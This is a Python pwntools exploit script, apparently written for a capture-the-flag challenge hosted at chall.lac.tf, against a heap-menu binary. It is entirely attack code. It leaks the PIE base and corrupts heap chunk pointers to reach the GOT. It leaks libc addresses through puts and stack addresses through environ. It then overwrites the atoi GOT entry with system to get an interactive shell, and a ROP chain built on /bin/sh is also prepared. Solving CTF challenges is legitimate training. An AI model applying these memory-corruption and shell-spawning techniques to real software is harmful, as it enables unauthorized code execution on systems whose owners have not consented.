#! /usr/bin/python
from pwn import *
# log_level = "debug"
context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chall.lac.tf"
PORT = 31338

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, value):
    sl(p, b"1")
    sla(p, b"index:", f"{value}".encode())
    ru(p, b"Choice:")

def edit(p, value):
    sl(p,b"2")
    sla(p, b"data:", value)
    ru(p,b"Choice:")

def explore(p, index):
    sl(p,b"4")
    sla(p, b"index:", "%i" % index)
    ru(p, b"Choice: ")

def view(p):
    sl(p,b"3")
    
    ru(p,b"data: ")
    ret = ru(p, b"=====")
    ru(p, b"Choice:")
    
    return ret

def reset(io):
    sl(io, b"5")
    ru(io, b"Choice:")

def exploit(io,e,l):
    io.recvuntil(b"gift:")
    pie = int(io.recvline(), 16) - e.sym["main"]

    print(f"===== PIE base: {hex(pie)}")

    # create initial chunks
    create(io, 0)
    create(io, 1)

    # scope is in new chunk, overwrite start->next[1]->next[0] to point to GOT
    explore(io, 0)
    edit(io, b"A"*0x28 + p64(0x71) + p64(e.got["puts"] + pie - 0x40))

    # go to the GOT pointer and leak
    reset(io)
    explore(io, 1)
    explore(io, 0)
    leak = view(io) 
    libc = int.from_bytes(leak[:8], "little") - l.sym["puts"]

    print(f"===== Libc leak: {hex(libc)}")

    # go back and repeat to get stack leak
    reset(io)
    explore(io, 0)
    edit(io, b"A"*0x28 + p64(0x71) + p64(l.sym["environ"] + libc - 0x40))

    reset(io)
    explore(io, 1)
    explore(io, 0)
    leak = view(io)
    stack = int.from_bytes(leak[:8], "little") - 0x1d0 + 0x20

    print(f"===== Stack leak: {hex(stack)}")

    # now overwrite ret ptr
    reset(io)
    explore(io, 0)
    #edit(io, b"A"*0x28 + p64(0x71) + p64(stack - 0x40))
    print(f"===== {hex(l.sym['_IO_file_jumps'] + libc)}")
    edit(io, b"A"*0x28 + p64(0x71) + p64(e.got["atoi"] + pie - 0x40))

    reset(io)
    explore(io, 1)
    explore(io, 0)

    # remote gadgets
    ret = 0x0000000000026e99 + libc
    pop_rdi = 0x00000000000277e5 + libc
    binsh = next(l.search(b"/bin/sh")) + libc

    payload = p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(l.sym["system"] + libc)

    edit(io, p64(l.sym["system"] + libc))
    #edit(io, p64(0xdeadbeef))
    #edit(io, payload)

    #io.sendline(b"10")

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")
    #l = ELF("/usr/lib/libc.so.6")

    exploit(p,e,l)
